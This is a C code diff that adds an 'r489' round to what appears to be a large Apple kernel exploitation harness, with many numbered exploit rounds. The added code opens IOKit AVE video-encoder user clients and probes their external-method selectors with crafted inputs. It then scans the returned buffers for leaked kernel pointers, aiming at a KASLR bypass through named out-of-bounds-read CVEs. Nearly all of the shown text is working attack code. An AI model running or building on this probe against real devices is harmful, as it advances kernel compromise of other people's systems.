@@ -24014,6 +24014,241 @@ r488_done:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r489: IOKit AVE registry + OOB read (CVE-2026-112466/112465)
+ *
+ * Two-pronged approach:
+ * 1. Enumerate IOKit AVE driver properties from IORegistry
+ *    to see if kernel object state is reflected
+ * 2. Open AVE user client and probe external methods that
+ *    may allow OOB reads (configInfo / getProperty paths)
+ *
+ * The OOB READ CVEs affect AVE's handling of configInfo
+ * requests where an index isn't bounds-checked before
+ * being used to read from internal arrays. This can leak
+ * kernel pointers for KASLR bypass.
+ * ============================================================ */
+
+static void r489_exploit(void) {
+    rlog("\n=== r489: IOKit AVE registry + OOB read probe ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Part 1: Find AVE IOKit services and dump their properties */
+    rlog("--- Part 1: IOKit AVE service enumeration ---\n");
+    {
+        CFMutableDictionaryRef matching;
+        io_iterator_t iter = 0;
+        kern_return_t kr;
+
+        /* Try different AVE-related service names */
+        const char *svc_names[] = {
+            "AppleAVE2Driver",
+            "AppleAVE2",
+            "AVEBridge",
+            "AppleAVEEncoder",
+            "AppleH16AVE",
+            "H16AVE",
+            "AppleAVD",
+            "AppleAVDUserClient",
+            "IOAVService",
+        };
+        int nsvc = sizeof(svc_names) / sizeof(svc_names[0]);
+
+        for (int s = 0; s < nsvc; s++) {
+            matching = IOServiceMatching(svc_names[s]);
+            if (!matching) continue;
+            kr = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iter);
+            if (kr != KERN_SUCCESS || !iter) continue;
+
+            io_service_t svc;
+            int found = 0;
+            while ((svc = IOIteratorNext(iter)) != 0) {
+                found++;
+                rlog("  Found service: %s (instance %d)\n", svc_names[s], found);
+
+                /* Get all properties */
+                CFMutableDictionaryRef props = NULL;
+                kr = IORegistryEntryCreateCFProperties(svc, &props,
+                    kCFAllocatorDefault, 0);
+                if (kr == KERN_SUCCESS && props) {
+                    CFIndex count = CFDictionaryGetCount(props);
+                    rlog("    %ld properties:\n", (long)count);
+
+                    /* Enumerate keys */
+                    CFIndex n = CFDictionaryGetCount(props);
+                    if (n > 0 && n < 200) {
+                        const void **keys = malloc(sizeof(void*) * n);
+                        const void **vals = malloc(sizeof(void*) * n);
+                        CFDictionaryGetKeysAndValues(props, keys, vals);
+                        for (CFIndex i = 0; i < n && i < 50; i++) {
+                            CFStringRef ks = (CFStringRef)keys[i];
+                            char kbuf[256] = {0};
+                            CFStringGetCString(ks, kbuf, 256, kCFStringEncodingUTF8);
+
+                            CFTypeRef v = vals[i];
+                            CFTypeID tid = CFGetTypeID(v);
+                            if (tid == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue(v, kCFNumberSInt64Type, &nv);
+                                rlog("    [%ld] %s = %lld\n", (long)i, kbuf, (long long)nv);
+                            } else if (tid == CFStringGetTypeID()) {
+                                char vbuf[256] = {0};
+                                CFStringGetCString(v, vbuf, 256, kCFStringEncodingUTF8);
+                                rlog("    [%ld] %s = \"%s\"\n", (long)i, kbuf, vbuf);
+                            } else if (tid == CFDataGetTypeID()) {
+                                CFIndex dlen = CFDataGetLength(v);
+                                rlog("    [%ld] %s = <data %ld bytes>", (long)i, kbuf, (long)dlen);
+                                const UInt8 *d = CFDataGetBytePtr(v);
+                                for (CFIndex j = 0; j < dlen && j < 32; j++)
+                                    rlog(" %02x", d[j]);
+                                rlog("\n");
+                            } else if (tid == CFBooleanGetTypeID()) {
+                                rlog("    [%ld] %s = %s\n", (long)i, kbuf,
+                                     CFBooleanGetValue(v) ? "true" : "false");
+                            } else {
+                                rlog("    [%ld] %s = <%s>\n", (long)i, kbuf,
+                                     CFStringGetCStringPtr(
+                                         CFCopyTypeIDDescription(tid),
+                                         kCFStringEncodingUTF8) ?: "unknown");
+                            }
+                        }
+                        if (n > 50) rlog("    ... (%ld more)\n", (long)(n - 50));
+                        free(keys);
+                        free(vals);
+                    }
+                    CFRelease(props);
+                }
+
+                /* Try to open a user client */
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                rlog("    IOServiceOpen type=0: kr=%d conn=%u\n", kr, conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    /* Probe external method selectors 0-15 with scalar input */
+                    rlog("    Probing external methods:\n");
+                    for (uint32_t sel = 0; sel < 16; sel++) {
+                        uint64_t in[8] = {0};
+                        uint64_t out[8] = {0};
+                        uint32_t outcnt = 8;
+                        kr = IOConnectCallScalarMethod(conn, sel,
+                            in, 1, out, &outcnt);
+                        if (kr != KERN_SUCCESS) {
+                            rlog("      sel %u: err 0x%x\n", sel, kr);
+                        } else {
+                            rlog("      sel %u: OK outcnt=%u", sel, outcnt);
+                            for (uint32_t j = 0; j < outcnt && j < 8; j++)
+                                rlog(" out[%u]=0x%llx", j, out[j]);
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Try structured input methods (configInfo-style) */
+                    rlog("    Probing struct methods:\n");
+                    for (uint32_t sel = 0; sel < 16; sel++) {
+                        uint8_t inbuf[64] = {0};
+                        uint8_t outbuf[4096] = {0};
+                        size_t outsize = 4096;
+                        /* Set first uint32 to various config IDs */
+                        *(uint32_t *)inbuf = sel;
+                        kr = IOConnectCallStructMethod(conn, sel,
+                            inbuf, 64, outbuf, &outsize);
+                        if (kr != KERN_SUCCESS) {
+                            rlog("      struct sel %u: err 0x%x\n", sel, kr);
+                        } else {
+                            rlog("      struct sel %u: OK outsize=%zu hex:", sel, outsize);
+                            for (size_t j = 0; j < outsize && j < 64; j++)
+                                rlog(" %02x", outbuf[j]);
+                            rlog("\n");
+                            /* Check for kernel-ish pointers (0xfffffff*) */
+                            for (size_t j = 0; j + 7 < outsize; j += 8) {
+                                uint64_t v;
+                                memcpy(&v, outbuf + j, 8);
+                                if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                                    rlog("      *** KPTR at off %zu: 0x%llx ***\n",
+                                         j, (unsigned long long)v);
+                                }
+                            }
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+
+                /* Try user client type 1 */
+                kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+                rlog("    IOServiceOpen type=1: kr=%d conn=%u\n", kr, conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    rlog("    (type 1 opened, probing sel 0-7)\n");
+                    for (uint32_t sel = 0; sel < 8; sel++) {
+                        uint64_t out[8] = {0};
+                        uint32_t outcnt = 8;
+                        kr = IOConnectCallScalarMethod(conn, sel,
+                            NULL, 0, out, &outcnt);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("      sel %u: OK outcnt=%u", sel, outcnt);
+                            for (uint32_t j = 0; j < outcnt; j++)
+                                rlog(" 0x%llx", out[j]);
+                            rlog("\n");
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+
+                IOObjectRelease(svc);
+            }
+            if (!found) rlog("  %s: no instances\n", svc_names[s]);
+            IOObjectRelease(iter);
+        }
+    }
+
+    /* Part 2: Enumerate ALL IORegistry entries under AppleARMPE
+     * looking for video-encoder-related services */
+    rlog("\n--- Part 2: IORegistry tree scan for video/AVE services ---\n");
+    {
+        io_iterator_t iter = 0;
+        CFMutableDictionaryRef match = IOServiceMatching("IOService");
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault, match, &iter);
+        if (kr == KERN_SUCCESS) {
+            io_service_t svc;
+            int count = 0;
+            while ((svc = IOIteratorNext(iter)) != 0 && count < 500) {
+                io_name_t name;
+                IORegistryEntryGetName(svc, name);
+                /* Filter for video/AVE/encoder related */
+                if (strstr(name, "AVE") || strstr(name, "ave") ||
+                    strstr(name, "Video") || strstr(name, "video") ||
+                    strstr(name, "Encode") || strstr(name, "encode") ||
+                    strstr(name, "VXE") || strstr(name, "vxe") ||
+                    strstr(name, "H26") || strstr(name, "h26") ||
+                    strstr(name, "HEVC") || strstr(name, "hevc") ||
+                    strstr(name, "Media") || strstr(name, "DCP")) {
+                    io_name_t cls;
+                    IOObjectGetClass(svc, cls);
+                    rlog("  [%d] %s (%s)\n", count, name, cls);
+
+                    /* Count properties */
+                    CFMutableDictionaryRef props = NULL;
+                    IORegistryEntryCreateCFProperties(svc, &props,
+                        kCFAllocatorDefault, 0);
+                    if (props) {
+                        rlog("       %ld properties\n",
+                             (long)CFDictionaryGetCount(props));
+                        CFRelease(props);
+                    }
+                }
+                IOObjectRelease(svc);
+                count++;
+            }
+            rlog("  Scanned %d services\n", count);
+            IOObjectRelease(iter);
+        }
+    }
+
+    rlog("\n=== r489 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -94091,6 +94326,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 493) {
+            rlog("*** rounds=493: IOKit AVE registry + OOB read probe ***\n\n");
+            fflush(stdout);
+            r489_exploit();
+            goto done;
+        }
         if (rounds == 492) {
             rlog("*** rounds=492: NTL OOB property leak + format desc ***\n\n");
             fflush(stdout);
@@ -97052,7 +97293,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
